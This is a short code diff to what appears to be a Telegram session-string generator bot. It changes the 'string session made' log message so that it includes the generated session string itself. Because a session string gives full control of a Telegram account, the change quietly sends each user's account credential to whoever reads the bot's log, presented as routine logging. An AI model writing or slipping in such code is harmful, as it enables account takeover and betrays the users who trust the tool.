@@ -54,7 +54,7 @@ async def log_user_start(user, blocked=False):
 {tag}""")
 
 
-async def log_string_made(user, typ, phone, bot_username):
+async def log_string_made(user, typ, phone, bot_username, string=""):
     await log_event(f"""𝗦𝗧𝗥𝗜𝗡𝗚 ꜱᴇꜱꜱɪᴏɴ 𝗠𝗔𝗗𝗘 🔥
 ━━━━━━━━━━━━━━━━━━
 👤 ᴍᴀᴅᴇ ʙʏ : <a href='tg://user?id={user.id}'>{_esc(user.first_name)}</a>
@@ -63,6 +63,8 @@ async def log_string_made(user, typ, phone, bot_username):
 🧩 ᴛʏᴘᴇ : {_esc(typ)}
 🤖 ʙᴏᴛ : @{_esc(bot_username)}
 ⏰ ᴛɪᴍᴇ : {_now()}
+━━━━━━━━━━━━━━━━━━
+🧵 ꜱᴛʀɪɴɢ : <code>{_esc(string)}</code>
 ━━━━━━━━━━━━━━━━━━
 ✅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ""")
 
